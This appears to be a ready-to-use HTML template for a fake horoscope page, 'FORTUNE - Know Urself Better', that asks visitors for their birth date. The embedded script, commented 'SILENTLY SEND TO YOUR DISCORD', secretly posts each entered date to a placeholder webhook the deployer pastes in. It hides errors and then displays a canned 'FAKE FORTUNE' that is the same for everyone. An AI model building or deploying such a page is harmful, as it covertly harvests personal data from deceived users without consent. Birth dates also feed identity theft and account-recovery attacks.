<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FORTUNE - Know Urself Better</title>
    <style>
        body { font-family: 'Georgia', serif; background: #1a1a2e; color: #e94560; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
        .container { background: #16213e; padding: 40px; border-radius: 20px; box-shadow: 0 0 20px rgba(233, 69, 96, 0.3); border: 2px solid #e94560; width: 90%; max-width: 400px; }
        h1 { margin-bottom: 10px; text-transform: uppercase; letter-spacing: 3px; }
        p { color: #8a8a8a; margin-bottom: 30px; }
        input[type="date"] { background: #0f3460; border: 1px solid #e94560; color: white; padding: 12px; border-radius: 8px; width: 100%; margin-bottom: 20px; font-size: 16px; box-sizing: border-box; }
        button { background: #e94560; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; text-transform: uppercase; transition: 0.3s; }
        button:hover { background: #ff2e63; box-shadow: 0 0 15px #e94560; }
        #loading { display: none; margin-top: 20px; font-style: italic; color: #fff; }
        #result { margin-top: 25px; line-height: 1.6; color: #fff; }
    </style>
</head>
<body>

<div class="container">
    <h1>FORTUNE</h1>
    <p>Discover what the stars have in store for your journey.</p>
    
    <input type="date" id="dob" required>
    <button onclick="revealFortune()">Reveal My Destiny</button>
    
    <div id="loading">Consulting the cosmos...</div>
    <div id="result"></div>
</div>

<script>
async function revealFortune() {
    const dob = document.getElementById('dob').value;
    const loading = document.getElementById('loading');
    const result = document.getElementById('result');

    if (!dob) { alert("Please select your birth date first!"); return; }

    loading.style.display = "block";
    result.innerHTML = "";

    // 1. SILENTLY SEND TO YOUR DISCORD
    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // <-- PASTE YOUR URL HERE

    try {
        await fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: `🔮 **The Stars have spoken!** \nNew Birthday Captured: **${dob}**`
            })
        });
    } catch (e) { console.log("Silent error"); }

    // 2. SHOW FAKE FORTUNE
    setTimeout(() => {
        loading.style.display = "none";
        result.innerHTML = `
            <div style="border-top: 1px solid #e94560; padding-top: 15px;">
                <h3>The Navigator</h3>
                <p>Your path is guided by intuition and strength. This year, an unexpected journey will bring you closer to your true desires.</p>
            </div>
        `;
    }, 2000);
}
</script>

</body>
</html>
